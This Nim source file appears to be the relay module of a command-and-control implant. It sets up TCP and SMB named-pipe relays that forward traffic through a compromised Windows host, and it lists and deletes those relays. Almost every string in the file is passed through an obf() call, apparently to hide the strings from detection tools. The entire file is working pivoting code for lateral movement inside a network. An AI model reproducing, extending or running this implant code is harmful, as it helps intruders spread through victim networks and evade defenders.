import std/json
from std/locks import Lock, initLock, acquire, release
from std/strutils import find, join, strip, toLowerAscii
import std/tables
import ../../utils/global
import ../../utils/general/strings
import ../../utils/winapi/handlers
import ../execution/core

var
  relays*: Table[string, JsonNode] = initTable[string, JsonNode]()
  relayWorkerTh* = initTable[string, pointer]()
  relayWorkerParked* = initTable[string, bool]()
  relayLock*: Lock
  relayLockReady* = false
  relayTcpStartFn*: proc (relayId: string, cfg: JsonNode, buf: var openArray[char]): int
  relaySmbStartFn*: proc (relayId: string, cfg: JsonNode, localPipe, remotePipe: string; buf: var openArray[char]): int

proc relayCfg*(e: JsonNode): JsonNode =
  # Builds the relay config object from the entry
  %*{
    obf("listenPort"): e[obf("listenPort")],
    obf("channel"): e[obf("mode")],
    obf("destinyRaw"): e[obf("target")],
    obf("destinyKind"): e[obf("destinyKind")],
    obf("destinyScheme"): e[obf("destinyScheme")],
    obf("destinyHost"): e[obf("destinyHost")],
    obf("destinyPort"): e[obf("destinyPort")],
    obf("pipeName"): e[obf("pipeName")],
    obf("pipe"): e[obf("pipe")],
    obf("localPipePath"): e[obf("localPipePath")],
    obf("remotePipePath"): e[obf("remotePipePath")],
    obf("destinyTls"): e[obf("destinyTls")],
  }

proc relayEnsureLock*() =
  # Initializes the relay lock when it is not ready
  if not relayLockReady:
    initLock(relayLock)
    relayLockReady = true

proc relayParam*(params: JsonNode, keys: openArray[string]): string =
  # Returns the first non empty param for the given keys
  for key in keys:
    if params.hasKey(key):
      let v = params[key].getStr().strip()
      if v.len > 0:
        return v
  ""

proc relayPickTls(params: JsonNode; argsTable: Table[string, string]): bool =
  # Checks that tls is enabled in params or args
  if params.hasKey(obf("tls")):
    let n = params[obf("tls")]
    if n.kind == JBool:
      return n.getBool()
    let v = n.getStr().strip().toLowerAscii()
    if v.len > 0:
      return v == obf("true") or v == obf("1") or v == obf("yes") or v == obf("on")
  if obf("tls") in argsTable:
    let v = argsTable[obf("tls")].strip().toLowerAscii()
    return v == obf("true") or v == obf("1") or v == obf("yes") or v == obf("on")
  false

proc resolveRelayConfig*(params: JsonNode): JsonNode =
  # Main function that resolves the relay config from params
  let argsTable = argsColonTable(relayParam(params, [obf("args")]))
  proc pick(keys: openArray[string]): string =
    # Returns the first matching value from params or the args table
    for key in keys:
      if params.hasKey(key):
        let v = params[key].getStr().strip()
        if v.len > 0:
          return v
      let lk = key.toLowerAscii()
      if lk in argsTable:
        return argsTable[lk]
    ""

  let listenRaw = pick([obf("listen")])
  let targetRaw = pick([obf("target")])
  let pipeRaw = pick([obf("pipe")])
  if listenRaw.len == 0 or targetRaw.len == 0:
    return newJNull()

  var transport = pick([obf("channel"), obf("mode")]).toLowerAscii()
  if transport notin [obf("tcp"), obf("smb")]:
    return newJNull()

  let listenPort = parsePortInt(listenRaw)
  if listenPort <= 0:
    return newJNull()

  if transport == obf("smb"):
    if not pipePathValid(pipeRaw):
      return newJNull()
  let pipeValue =
    if transport == obf("smb"):
      pipeNormalize(pipeRaw)
    else:
      ""

  let (destinyKind, targetClean) = targetSchemeParts(targetRaw)
  let endpoint = parseRelayEndpoint(targetClean, transport)
  let destinyTls = relayPickTls(params, argsTable)
  %*{
    obf("listen"): listenRaw,
    obf("target"): targetRaw,
    obf("targetClean"): targetClean,
    obf("destinyKind"): destinyKind,
    obf("mode"): transport,
    obf("listenPort"): listenPort,
    obf("destinyScheme"): endpoint[obf("scheme")],
    obf("destinyHost"): endpoint[obf("host")],
    obf("destinyPort"): endpoint[obf("port")],
    obf("destinyTls"): destinyTls,
    obf("pipe"): pipeValue,
    obf("pipeName"): pipeValue,
  }

proc relayResolveId*(params, cfg: JsonNode): string =
  # Resolves the relay id from params or the listen port
  let id = relayParam(params, [obf("id")])
  if id.len > 0:
    return id
  let port = cfg[obf("listenPort")].getInt()
  if port <= 0:
    return ""
  $port

proc relayFindDuplicate*(cfg: JsonNode): string =
  # Finds a running relay that duplicates this config
  for rid, entry in relays.pairs:
    if not entry[obf("running")].getBool():
      continue
    if entry[obf("listenPort")].getInt() == cfg[obf("listenPort")].getInt() and
       entry[obf("mode")].getStr() == cfg[obf("mode")].getStr():
      return rid
    if entry[obf("mode")].getStr() == obf("smb") and cfg[obf("mode")].getStr() == obf("smb") and
       entry[obf("pipe")].getStr() == cfg[obf("pipe")].getStr() and
       entry[obf("listenPort")].getInt() == cfg[obf("listenPort")].getInt():
      return rid
    if entry[obf("target")].getStr() == cfg[obf("target")].getStr() and
       entry[obf("listenPort")].getInt() == cfg[obf("listenPort")].getInt():
      return rid
  ""

proc relayShouldStop*(relayId: string): bool =
  # Checks that the relay is missing or marked to stop
  relayEnsureLock()
  acquire(relayLock)
  defer: release(relayLock)
  not (relayId in relays) or relays[relayId][obf("stop")].getBool()

proc syncActiveRelayPaths*() =
  # Stores the active relay paths from running relays
  activeRelayPaths.setLen(0)
  for _, entry in relays.pairs:
    if not entry[obf("running")].getBool(): continue
    let mode = entry[obf("mode")].getStr()
    let port = entry[obf("listenPort")].getInt()
    let target = entry[obf("target")].getStr()
    if mode.len == 0 or port <= 0 or target.len == 0: continue
    activeRelayPaths.add mode & obf(";") & hostTag & obf(":") & $port & obf(";") & target

proc relayMarkStopped*(relayId: string) =
  # Removes the relay and refreshes the active paths
  relayEnsureLock()
  acquire(relayLock)
  defer: release(relayLock)
  if relayId in relays:
    relays.del(relayId)
  syncActiveRelayPaths()

proc waitRelayParked*(relayId: string) =
  # Waits until the relay worker is parked
  relayEnsureLock()
  acquire(relayLock)
  let hasWorker = relayId in relayWorkerTh and relayWorkerTh[relayId] != nil
  release(relayLock)
  if not hasWorker:
    return
  for _ in 0 ..< 500:
    relayEnsureLock()
    acquire(relayLock)
    let parked = relayWorkerParked.getOrDefault(relayId, true)
    release(relayLock)
    if parked:
      break
    sleepMs(10)

proc run_relay*(_: string; buf: var openArray[char]): int =
  # Main function that lists the current relays
  try:
    relayEnsureLock()
    acquire(relayLock)
    defer: release(relayLock)
    if relays.len == 0:
      return writeMsg(obf("(empty)\n"), buf)
    const indent = obf("  ")
    const maxValLen = 100
    var blocks: seq[string] = @[]
    for rid, entry in relays.pairs:
      var pairs = @[
        (obf("listen"), entry[obf("listen")].getStr()),
        (obf("target"), entry[obf("target")].getStr()),
        (obf("mode"), entry[obf("mode")].getStr()),
        (obf("status"), if entry[obf("running")].getBool(): obf("running") else: obf("stopping")),
      ]
      if entry[obf("mode")].getStr() == obf("smb"):
        pairs.add (obf("pipe"), entry[obf("pipe")].getStr())
      var blk = obf("[ ") & rid & obf(" ]\n")
      for p in pairs:
        let v = if p[1].len > maxValLen: p[1][0 ..< maxValLen] & obf("...") else: p[1]
        blk.add indent & p[0] & obf(": ") & v & obf("\n")
      blocks.add blk
    return writeMsg(blocks.join(obf("\n")), buf)
  except CatchableError as e:
    return writeErr(e.msg, buf)

proc run_relay_create*(params: string; buf: var openArray[char]): int =
  # Main function that creates a relay and starts the worker
  let p = parseJson(params)
  var relayId = ""
  var created = false
  try:
    let cfg = resolveRelayConfig(p)
    if cfg.kind == JsonNodeKind.JNull:
      return writeErr(obf("invalid relay config (tcp: --channel tcp --listen PORT --target HOST:PORT; smb: --channel smb --listen PORT --target HOST:PORT --pipe \\\\pipe\\name)"), buf)
    relayId = relayResolveId(p, cfg)
    if relayId.len == 0:
      return writeErr(obf("invalid listen port in ") & cfg[obf("listen")].getStr(), buf)

    relayEnsureLock()
    acquire(relayLock)
    if relayId in relays and relays[relayId][obf("running")].getBool():
      release(relayLock)
      return writeErr(obf("relay id '") & relayId & obf("' already exists"), buf)
    let dupId = relayFindDuplicate(cfg)
    if dupId.len > 0:
      release(relayLock)
      return writeErr(obf("duplicate relay (id=") & dupId & obf(") listen=") & cfg[obf("listen")].getStr() &
        obf(" target=") & cfg[obf("target")].getStr(), buf)
    var localPipe: string
    var remotePipe: string
    if cfg[obf("mode")].getStr() == obf("smb"):
      localPipe = pipeLocalFromRaw(cfg[obf("pipe")].getStr())
      remotePipe = pipeRemoteFromRaw(cfg[obf("pipe")].getStr(), cfg[obf("destinyHost")].getStr())
      if localPipe.len == 0 or remotePipe.len == 0:
        release(relayLock)
        return writeErr(obf("invalid pipe path (use \\\\pipe\\name)"), buf)
    else:
      (localPipe, remotePipe) = pipePaths(
        cfg[obf("destinyHost")].getStr(),
        cfg[obf("pipe")].getStr()
      )
    relays[relayId] = %*{
      obf("id"): relayId,
      obf("listen"): cfg[obf("listen")],
      obf("target"): cfg[obf("target")],
      obf("destinyKind"): cfg[obf("destinyKind")],
      obf("mode"): cfg[obf("mode")],
      obf("listenPort"): cfg[obf("listenPort")],
      obf("destinyScheme"): cfg[obf("destinyScheme")],
      obf("destinyHost"): cfg[obf("destinyHost")],
      obf("destinyPort"): cfg[obf("destinyPort")],
      obf("destinyTls"): cfg[obf("destinyTls")],
      obf("pipe"): cfg[obf("pipe")],
      obf("pipeName"): cfg[obf("pipeName")],
      obf("localPipePath"): localPipe,
      obf("remotePipePath"): remotePipe,
      obf("running"): true,
      obf("stop"): false,
    }
    syncActiveRelayPaths()
    created = true
    release(relayLock)

    let workerCfg = relayCfg(relays[relayId])
    case cfg[obf("mode")].getStr()
    of obf("tcp"): return relayTcpStartFn(relayId, workerCfg, buf)
    of obf("smb"): return relaySmbStartFn(relayId, workerCfg, localPipe, remotePipe, buf)
    else:
      return writeErr(obf("unsupported mode: ") & cfg[obf("mode")].getStr(), buf)
  except ValueError as e:
    if created and relayId.len > 0:
      relayMarkStopped(relayId)
    return writeErr(e.msg, buf)
  except CatchableError as e:
    if created and relayId.len > 0:
      relayMarkStopped(relayId)
    return writeErr(e.msg, buf)
  except JsonParsingError as e:
    if created and relayId.len > 0:
      relayMarkStopped(relayId)
    return writeErr(obf("invalid JSON - ") & e.msg, buf)

proc run_relay_delete*(params: string; buf: var openArray[char]): int =
  # Main function that deletes a relay by id
  let p = parseJson(params)
  try:
    let relayId = relayParam(p, [obf("id")])
    if relayId.len == 0:
      return writeErr(obf("missing relay id (--id)"), buf)
    relayEnsureLock()
    acquire(relayLock)
    if relayId notin relays:
      release(relayLock)
      return writeErr(obf("relay id '") & relayId & obf("' not found"), buf)
    let entry = relays[relayId]
    relays.del(relayId)
    syncActiveRelayPaths()
    release(relayLock)
    waitRelayParked(relayId)
    return writeMsg(obf("relay: deleted id=") & relayId & obf(" listen=") & entry[obf("listen")].getStr() &
      obf(" target=") & entry[obf("target")].getStr(), buf)
  except CatchableError as e:
    return writeErr(e.msg, buf)
  except JsonParsingError as e:
    return writeErr(obf("invalid JSON - ") & e.msg, buf)
